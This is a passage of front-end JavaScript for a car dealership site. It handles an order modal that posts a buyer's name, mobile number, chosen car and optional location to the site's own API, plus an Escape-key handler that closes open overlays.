  const car = carDatabase.find(c => c.id === carId);
  if (!car) return;

  // Close car detail if open
  closeCarDetail();

  state.currentCarId = carId;
  DOM.modalCarName.textContent = `${car.brand} ${car.model}`;
  DOM.modalCarPrice.textContent = `${car.priceLakh} (Ex-Showroom)`;
  DOM.orderName.value = state.userName || '';
  DOM.orderMobile.value = state.mobile || '';

  DOM.orderForm.style.display = 'block';
  DOM.modalSuccess.style.display = 'none';
  DOM.orderModal.style.display = 'flex';
  DOM.orderModal.style.flexDirection = 'column';
  document.body.style.overflow = 'hidden';
}

window.openOrderModal = openOrderModal;

function closeOrderModal() {
  DOM.orderModal.style.display = 'none';
  document.body.style.overflow = '';
  state.currentCarId = null;
}

async function submitOrder(e) {
  e.preventDefault();
  const car = carDatabase.find(c => c.id === state.currentCarId);
  if (!car) return;

  const submitBtn = DOM.orderForm.querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<div class="spinner" style="width:16px;height:16px;border-width:2px;"></div> Submitting...';

  let locationStr = 'Not shared';
  if (state.latitude && state.longitude) locationStr = `${state.latitude.toFixed(6)}, ${state.longitude.toFixed(6)}`;

  try {
    const response = await fetch('/api/order', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: DOM.orderName.value, mobile: DOM.orderMobile.value, carId: car.id, carModel: `${car.brand} ${car.model}`, location: locationStr })
    });
    const data = await response.json();
    if (data.success) {
      DOM.orderForm.style.display = 'none'; DOM.modalSuccess.style.display = 'block';
      if (window.lucide) lucide.createIcons();
    }
  } catch (error) { alert('Something went wrong. Please try again.'); }

  submitBtn.disabled = false;
  submitBtn.innerHTML = '<i data-lucide="send" class="icon"></i> Get Dealer Callback';
  if (window.lucide) lucide.createIcons();
}

// ═══════════════════════════════════════════════
//              KEYBOARD SHORTCUTS
// ═══════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    if (DOM.carDetailOverlay?.style.display === 'flex') closeCarDetail();
    if (DOM.orderModal.style.display === 'flex') closeOrderModal();
    if (DOM.otpSection.style.display === 'block') closeOtpSection();
  }
});
